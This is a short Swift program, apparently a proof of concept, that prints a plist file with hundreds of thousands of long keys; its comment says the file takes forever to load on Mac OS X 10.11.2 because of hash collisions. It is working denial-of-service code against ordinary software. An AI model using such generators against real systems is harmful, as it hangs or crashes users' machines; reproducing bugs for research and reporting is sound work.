/*
This generates a plist file which takes forever to load. Hash collision on Mac OS X 10.11.2
*/


print("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
print("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">")
print("<plist version=\"1.0\">")
print("<dict>")

let a = "0123456789abcdef"
let a32 = a+a

let down = 100
for i in (down..<(down * 10)) {
    for j in (down..<(down * 10)) {
        
        print("<key>" + a32 + String(i) + a32 + String(j) + a32 + "</key>")
        print("<string>YES</string>")
    }
}
print("</dict>")
print("</plist>")
